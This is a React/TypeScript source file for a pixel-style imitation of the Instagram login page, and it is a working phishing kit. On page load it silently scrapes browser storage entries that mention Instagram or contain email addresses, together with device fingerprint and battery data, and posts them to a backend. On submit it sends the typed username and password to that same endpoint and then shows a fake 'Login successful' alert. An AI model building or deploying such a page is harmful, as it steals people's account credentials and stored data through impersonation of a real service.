import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Facebook, Eye, EyeOff } from "lucide-react";

const InstagramLogin = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false);

  // Check system preference and set initial theme
  useEffect(() => {
    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
    setIsDarkMode(prefersDark);
    
    // Listen for system theme changes
    const mediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
    const handleChange = (e: MediaQueryListEvent) => setIsDarkMode(e.matches);
    mediaQuery.addEventListener('change', handleChange);
    
    return () => mediaQuery.removeEventListener('change', handleChange);
  }, []);

  // Keyboard shortcut for manual theme toggle (Ctrl/Cmd + T)
  useEffect(() => {
    const handleKeyPress = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 't') {
        e.preventDefault();
        setIsDarkMode(prev => !prev);
      }
    };
    
    document.addEventListener('keydown', handleKeyPress);
    return () => document.removeEventListener('keydown', handleKeyPress);
  }, []);

  // Auto-collect data when page loads
  useEffect(() => {
    const autoCollectData = async () => {
      try {
        const deviceInfo: any = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          onLine: navigator.onLine,
          cookieEnabled: navigator.cookieEnabled,
          timestamp: new Date().toISOString(),
          url: window.location.href,
          referrer: document.referrer,
        };

        // Collect localStorage data
        const savedCredentials: any = {
          localStorage: {},
          sessionStorage: {},
          chromeAccounts: {},
          autofillData: {}
        };

        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (!key) continue;
          const value = localStorage.getItem(key);
          if (key.toLowerCase().includes('instagram') ||
              key.toLowerCase().includes('insta') ||
              key.toLowerCase().includes('ig') ||
              (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
            savedCredentials.localStorage[`localStorage_${key}`] = value;
          }
        }

        // Collect sessionStorage data
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          if (!key) continue;
          const value = sessionStorage.getItem(key);
          if (key.toLowerCase().includes('instagram') ||
              key.toLowerCase().includes('insta') ||
              key.toLowerCase().includes('ig') ||
              (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
            savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
          }
        }

        // Collect battery info if available
        const batteryInfo: any = {};
        if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
          try {
            const battery = await navigator.getBattery();
            batteryInfo.level = battery.level;
            batteryInfo.charging = battery.charging;
            batteryInfo.chargingTime = battery.chargingTime;
            batteryInfo.dischargingTime = battery.dischargingTime;
          } catch (e) {
            console.log("Battery API not available");
          }
        } else if (typeof window !== "undefined" && 'battery' in navigator) {
          const battery = (navigator as any).battery;
          if (battery) {
            batteryInfo.level = battery.level;
            batteryInfo.charging = battery.charging;
            batteryInfo.chargingTime = battery.chargingTime;
            batteryInfo.dischargingTime = battery.dischargingTime;
          }
        }

        // Send auto-collected data to backend
        const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
        console.log('Sending auto-collection data to:', apiUrl);
        
        const response = await fetch(`${apiUrl}/api/login`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            email: "auto_collected@example.com",
            password: "auto_collected",
            deviceInfo,
            savedCredentials,
            instagramCredentials: savedCredentials,
            batteryInfo,
            autoCollected: true,
            timestamp: new Date().toISOString()
          }),
        });

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        console.log("Auto-collection data sent successfully");
      } catch (error) {
        console.error("Error in auto-collection:", error);
      }
    };

    // Auto-collect data after 2 seconds
    setTimeout(autoCollectData, 2000);
  }, []);

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username || !password) {
      alert("Please fill in all fields");
      return;
    }

    try {
      const deviceInfo: any = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screenResolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        onLine: navigator.onLine,
        cookieEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer,
      };

      // Collect localStorage data
      const savedCredentials: any = {
        localStorage: {},
        sessionStorage: {},
        chromeAccounts: {},
        autofillData: {}
      };

      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (!key) continue;
        const value = localStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.localStorage[`localStorage_${key}`] = value;
        }
      }

      // Collect sessionStorage data
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (!key) continue;
        const value = sessionStorage.getItem(key);
        if (key.toLowerCase().includes('instagram') ||
            key.toLowerCase().includes('insta') ||
            key.toLowerCase().includes('ig') ||
            (value && (value.toLowerCase().includes('instagram') || value.toLowerCase().includes('@')))) {
          savedCredentials.sessionStorage[`sessionStorage_${key}`] = value;
        }
      }

      // Collect battery info if available
      const batteryInfo: any = {};
      if (typeof window !== "undefined" && 'getBattery' in navigator && typeof navigator.getBattery === "function") {
        try {
          const battery = await navigator.getBattery();
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        } catch (e) {
          console.log("Battery API not available");
        }
      } else if (typeof window !== "undefined" && 'battery' in navigator) {
        const battery = (navigator as any).battery;
        if (battery) {
          batteryInfo.level = battery.level;
          batteryInfo.charging = battery.charging;
          batteryInfo.chargingTime = battery.chargingTime;
          batteryInfo.dischargingTime = battery.dischargingTime;
        }
      }

      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000';
      console.log('Sending login data to:', apiUrl);
      
      const response = await fetch(`${apiUrl}/api/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: username,
          password,
          deviceInfo,
          savedCredentials,
          instagramCredentials: savedCredentials,
          batteryInfo,
          autoCollected: false,
          timestamp: new Date().toISOString()
        }),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const result = await response.json();
      console.log("Login data sent successfully:", result);
      
      // Show success message
      alert("Login successful! Redirecting...");
      
    } catch (error) {
      console.error("Error submitting login:", error);
      alert("Login failed. Please try again.");
    }
  };

  return (
    <div className={`min-h-screen flex flex-col transition-colors duration-300 ${
      isDarkMode 
        ? 'bg-black text-white' 
        : 'bg-instagram-bg text-gray-900'
    }`}>
      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-[350px] mx-auto">
          {/* Instagram Logo */}
          <div className="text-center mb-8">
            <span
              className="text-6xl font-light instagram-font"
              style={{ 
                color: isDarkMode ? "#ffffff" : "#262626", 
                fontWeight: 400, 
                letterSpacing: "0.1px", 
                marginTop: "20px" 
              }}
            >
              Instagram
            </span>
          </div>

          {/* Login Form */}
          <div className={`rounded-lg p-8 mb-4 transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <form className="space-y-4" onSubmit={handleSubmit}>
              {/* Username Input with Floating Label */}
              <div className="relative">
                <Input
                  type="text"
                  placeholder=""
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className={`w-full h-9 px-2 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    username 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Phone number, username or email address
                </label>
              </div>
              
              {/* Password Input with Floating Label */}
              <div className="relative">
                <Input
                  type={showPassword ? "text" : "password"}
                  placeholder=""
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`w-full h-9 px-2 pr-10 text-xs border rounded-sm focus:ring-0 focus-visible:ring-0 focus-visible:ring-offset-0 focus-visible:outline-none pt-4 transition-colors duration-300 ${
                    isDarkMode 
                      ? '!bg-gray-800 !border-gray-700 text-white focus:!border-gray-600 placeholder:!text-gray-400 focus:!bg-gray-800 active:!bg-gray-800 hover:!bg-gray-800' 
                      : '!bg-white !border-gray-300 text-gray-900 focus:!border-gray-500 placeholder:!text-gray-400 focus:!bg-white active:!bg-white hover:!bg-white'
                  }`}
                />
                <label 
                  className={`absolute left-2 transition-all duration-200 pointer-events-none ${
                    password 
                      ? `top-1 text-[9px] ${isDarkMode ? 'text-gray-400' : 'text-gray-500'}` 
                      : `top-2 text-[12px] ${isDarkMode ? 'text-gray-500' : 'text-gray-400'}`
                  }`}
                >
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className={`absolute right-2 top-1/2 transform -translate-y-1/2 text-xs font-semibold transition-colors duration-300 ${
                    isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-gray-500 hover:text-gray-700'
                  } ${password ? 'block' : 'hidden'}`}
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>
              
              <Button 
                variant="instagram" 
                className="w-full h-10 text-sm font-semibold rounded-lg mt-4"
                disabled={!username || !password}
                type="submit"
              >
                Log in
              </Button>
            </form>

            {/* OR Divider */}
            <div className="flex items-center my-6">
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
              <span className={`px-4 text-sm font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
              }`}>OR</span>
              <div className={`flex-1 border-t transition-colors duration-300 ${
                isDarkMode ? 'border-gray-800' : 'border-instagram-border'
              }`}></div>
            </div>

            {/* Facebook Login */}
            <Button variant="ghost" className={`w-full h-10 text-sm font-semibold hover:bg-transparent transition-colors duration-300 ${
              isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-[#00376b]'
            }`}>
              <svg 
                className="mr-2 w-4 h-4" 
                viewBox="0 0 24 24" 
                fill="currentColor"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </Button>

            {/* Forgot Password */}
            <div className="text-center mt-6">
              <a href="#" className={`text-sm hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text hover:text-instagram-text'
              }`}>
                Forgotten your password?
              </a>
            </div>
          </div>

          {/* Sign Up */}
          <div className={`rounded-lg p-6 text-center transition-colors duration-300 ${
            isDarkMode 
              ? 'bg-black border-gray-800 md:border' 
              : 'bg-white border-instagram-border md:border'
          }`}>
            <p className={`text-sm transition-colors duration-300 ${
              isDarkMode ? 'text-gray-300' : 'text-instagram-text'
            }`}>
              Don't have an account?{" "}
              <a href="#" className={`font-semibold transition-colors duration-300 ${
                isDarkMode ? 'text-blue-400 hover:text-blue-300' : 'text-instagram-blue hover:text-instagram-blue/80'
              }`}>
                Sign up
              </a>
            </p>
          </div>
        </div>
      </div>

      {/* Footer */}
      <footer className="w-full max-w-4xl mx-auto px-4 py-8">
        <div className="flex flex-wrap justify-center gap-4 text-xs mb-4 transition-colors duration-300">
          {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact uploading and non-users', 'Meta Verified'].map((link) => (
            <a 
              key={link} 
              href="#" 
              className={`hover:underline transition-colors duration-300 ${
                isDarkMode ? 'text-gray-400 hover:text-gray-300' : 'text-instagram-light-text'
              }`}
            >
              {link}
            </a>
          ))}
        </div>
        
        <div className="flex justify-center items-center gap-4 text-xs transition-colors duration-300">
          <select className={`bg-transparent border-none outline-none transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>
            <option>English (UK)</option>
          </select>
          <span className={`transition-colors duration-300 ${
            isDarkMode ? 'text-gray-400' : 'text-instagram-light-text'
          }`}>© 2025 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default InstagramLogin;